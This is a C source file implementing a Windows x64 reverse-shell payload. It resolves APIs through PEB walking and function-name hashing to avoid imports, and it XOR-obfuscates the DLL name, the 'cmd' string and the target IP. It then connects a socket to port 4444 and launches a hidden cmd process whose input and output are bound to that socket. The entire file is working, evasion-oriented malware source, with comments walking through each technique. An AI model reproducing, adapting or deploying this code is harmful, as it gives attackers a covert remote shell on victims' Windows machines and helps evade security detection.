#include "structs.h"
#include <stdio.h>

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

#define KEY1 0x25
#define KEY2 0x0e
#define KEY3 0x96

#define SEED                7
#define LOADLIBRARYA_H      3316055624
#define CREATEPROCESSA_H    1259903768
#define WSASTARTUP_H        338422188
#define WSASOCKETA_H        356187912
#define CONNECT_H           1601391134

#define LOSELOSE_HASH(s, hash) do {                   \
    (hash) = 0;                                       \
    const char *_p = (s);                             \
    int _c;                                           \
    while ((_c = (unsigned char)(*_p++))) {           \
        (hash) += _c;                                 \
        (hash) *= (_c + SEED);                        \
    }                                                 \
} while (0)

#ifndef ARRAYSIZE
#define ARRAYSIZE(a)            (sizeof(a)/sizeof((a)[0]))
#endif

#define XOR_ARR(buf, key)       xor_n((buf), ARRAYSIZE(buf), (key))
#define HTONS(x)                ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

static inline  __attribute__((always_inline)) unsigned char xor8(unsigned char x, unsigned char y) {
	return x ^ y ;
}

static inline  __attribute__((always_inline)) void xor_n(unsigned char *buf, size_t n, unsigned char key) {
    for (size_t i = 0; i < n; ++i)
		buf[i] = xor8(buf[i], key);
}

static HMODULE GetProcAddressPEB(DWORD64 qwFuncHash) {    
	PIMAGE_EXPORT_DIRECTORY pImgExportDir;
	DWORD dwFunctionNumber, dwHash;    
	PDWORD pdwFuncNameBase;
	PCSTR pszFunctionName;
	WORD wOrdinalIndex;

	PPEB pPEB = (PPEB) __readgsqword( 0x60 ); // Access the PEB structure directly via GS:[0x60] on x64.
	PPEB_LDR_DATA Ldr = (PPEB_LDR_DATA) pPEB->Ldr; // The PEB contains a pointer to PEB_LDR_DATA, which has a linked list of loaded modules.    
	PLIST_ENTRY pNextModule = Ldr->InLoadOrderModuleList.Flink; // This is the first module (usually the main EXE), and from here we walk the list.    
	PLDR_DATA_TABLE_ENTRY DataTableEntry = (PLDR_DATA_TABLE_ENTRY) pNextModule;	 
	while (DataTableEntry->DllBase != NULL) {    
    	DWORD64 qwModuleBase = (DWORD64)DataTableEntry->DllBase;	// Loop over all modules. DllBase is the base address of the module in memory.    
    	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS) ( qwModuleBase + ((PIMAGE_DOS_HEADER) qwModuleBase)->e_lfanew); // Locate NT headers using the PE structure (DOS header --> NT header).    
    	DWORD dwExportDirRVA = pImgNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress; // This retrieves the Export Directory from the module.
    	DataTableEntry = (PLDR_DATA_TABLE_ENTRY) DataTableEntry->InLoadOrderLinks.Flink; // Get the next loaded module entry (ntdll.dll --> kernel32.dll)
    	if (dwExportDirRVA == 0) {
        	continue;
    	}    
    	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) ((DWORD64) qwModuleBase + dwExportDirRVA); // Get a pointer to the actual export directory table.
    	dwFunctionNumber = pImgExportDir->NumberOfNames;
    	pdwFuncNameBase = (PDWORD) ((PCHAR) qwModuleBase + pImgExportDir->AddressOfNames);  // Extract names of all exported functions from the module.
    	for (DWORD idx = 0; idx < dwFunctionNumber; idx++) {
        	pszFunctionName = (PCSTR) (*pdwFuncNameBase + (DWORD64) qwModuleBase);
        	pdwFuncNameBase++;    
        	LOSELOSE_HASH(pszFunctionName, dwHash);    
        	if (dwHash == qwFuncHash) {	// For each function, hash its name and compare it to the input hash.                       	 
            	wOrdinalIndex = *(PWORD)(((DWORD64) qwModuleBase + pImgExportDir->AddressOfNameOrdinals) + (2 * idx));
            	return (HMODULE) ((DWORD64) qwModuleBase + *(PDWORD)(((DWORD64) qwModuleBase + pImgExportDir->AddressOfFunctions) + (4 * wOrdinalIndex))); // If matched, resolve function address using its ordinal --> RVA --> VA.                               	 
        	}
    	}
	}
	return NULL;
}

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void Main(void) {
    
	int port = 4444 ;

	unsigned char ip[] = {0x71, 0x0e, 0x0e, 0x0f, 0x0e};
	
	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
	char ws2_32_dll[] = {0x52, 0x56, 0x17, 0x7a, 0x16, 0x17, 0x0b, 0x41, 0x49, 0x49, 0x25};

	//	 cmd	  0x63, 0xcd, 0x64, key
	char cmd[] = {0xf5, 0xfb, 0xf2, 0x96};
	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key

	RUNTIME_CONTEXT ctx = { 0 };
	ctx.api.pLoadLibraryA = (PLOADLIBRARYA)GetProcAddressPEB(LOADLIBRARYA_H);
	XOR_ARR(ws2_32_dll, KEY1);
	ctx.api.pLoadLibraryA(ws2_32_dll);
	ctx.api.pWSAStartup = (PWSASTARTUP)GetProcAddressPEB(WSASTARTUP_H);
	ctx.api.pWSAStartup(MAKEWORD(2, 2), &ctx.winsock.wsadata);
	ctx.api.pWSASocketA = (PWSASOCKETA)GetProcAddressPEB(WSASOCKETA_H);
	ctx.winsock.socket = ctx.api.pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
	ctx.winsock.sa.sin_family = AF_INET;
	ctx.winsock.sa.sin_port = HTONS(port);
	XOR_ARR(ip, KEY2);
	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b1 = ip[0]; 
	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b2 = ip[1]; 
	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b3 = ip[2]; 
	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b4 = ip[3]; 
	ctx.api.pConnect = (PCONNECT)GetProcAddressPEB(CONNECT_H);
	ctx.api.pConnect(ctx.winsock.socket, (struct sockaddr*)&ctx.winsock.sa, sizeof(ctx.winsock.sa)); 
	ctx.process.si.cb = sizeof(ctx.process.si);
	ctx.process.si.dwFlags = (STARTF_USESTDHANDLES);
	ctx.process.si.hStdInput = (HANDLE)ctx.winsock.socket;
	ctx.process.si.hStdOutput = (HANDLE)ctx.winsock.socket;
	ctx.process.si.hStdError = (HANDLE)ctx.winsock.socket;
	XOR_ARR(cmd, KEY3);
	ctx.api.pCreateProcessA = (PCREATEPROCESSA)GetProcAddressPEB(CREATEPROCESSA_H);
	ctx.api.pCreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ctx.process.si, &ctx.process.pi); 

}

